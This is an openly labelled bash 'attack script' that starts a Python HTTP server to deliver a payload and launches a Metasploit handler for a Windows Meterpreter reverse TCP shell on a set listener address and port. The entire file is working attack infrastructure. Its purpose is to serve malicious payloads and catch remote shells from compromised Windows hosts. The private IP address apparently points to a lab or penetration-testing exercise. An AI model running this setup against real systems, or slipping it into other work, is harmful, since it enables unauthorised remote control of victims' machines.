#!/bin/bash

# Start Attack Script

echo "=== Starting Attack Sequence ==="

# Set variables
LHOST="192.168.20.10"
LPORT="4444"

# Start HTTP server for payload delivery
echo "[1] Starting HTTP server on port 9999..."
python3 -m http.server 9999 &
HTTP_PID=$!
echo "HTTP Server running (PID: $HTTP_PID)"

# Start Metasploit listener
echo "[2] Starting Metasploit listener..."
echo "Running: msfconsole -q -x 'use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j'"

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j"

# Cleanup
kill $HTTP_PID 2>/dev/null
echo "HTTP Server stopped."
